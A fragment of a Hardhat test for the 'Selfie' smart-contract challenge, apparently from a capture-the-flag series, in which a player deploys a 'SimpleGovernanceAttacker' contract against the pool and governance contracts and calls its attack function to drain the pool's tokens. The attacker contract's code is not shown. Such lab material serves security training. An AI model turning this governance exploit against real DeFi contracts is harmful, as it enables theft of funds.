...
describe('[Challenge] Selfie', function () {
  ...
  let token: Contract, governance: Contract, pool: Contract;
  ...
  it('Execution', async function () {
    ...
    const simpleGovernanceAttacker = await (
      await ethers.getContractFactory('SimpleGovernanceAttacker', player)
    ).deploy(pool.address, governance.address, token.address, player.address);

    await simpleGovernanceAttacker.attack(TOKENS_IN_POOL);
